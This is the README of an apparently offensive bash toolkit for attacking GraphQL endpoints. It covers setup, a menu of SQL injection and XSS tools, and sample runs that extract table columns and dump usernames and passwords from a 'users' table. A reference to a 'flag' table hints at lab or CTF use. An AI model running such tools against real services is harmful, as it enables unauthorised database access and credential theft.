## Setup

Clone the repository:
```bash
git clone https://github.com/zanderson73/graphql-attack-toolkit.git
cd graphql-attack-toolkit


# Make the scripts executable:

chmod +x *.sh

# Run the main launcher script:

./graphql_attack_toolkit.sh

#Dependencies

curl for making HTTP requests
jq for JSON parsing

bash (preferred) for running the scripts

# Menu Options
# SQLi Column Extractor
# Get column names from a target table.

[+] Enter GraphQL endpoint URL: http://target/graphql
[+] Enter table name to extract columns from: users

# Expected Output:

[+] Column names for "users": id, username, password

# SQLi Data Exfiltrator
# Dump real values using column names.

[+] Enter GraphQL endpoint URL: http://target/graphql
[+] Enter table name to extract from: users
[+] Enter comma-separated column names: id,username,password

# Expected Output:

[+] Extracted data from "users":
id: 1, username: admin, password: password123

# XSS/SQLi Recon Scanner
# Launch pre-defined SQLi and XSS payloads and analyze backend behavior.

[+] Enter GraphQL endpoint URL: http://target/graphql

# Sample Commands (Standalone Use)

# Dump table names
./graphql_sqli_exfil.sh http://target/graphql information_schema.tables table_name

# Dump columns from "flag" table
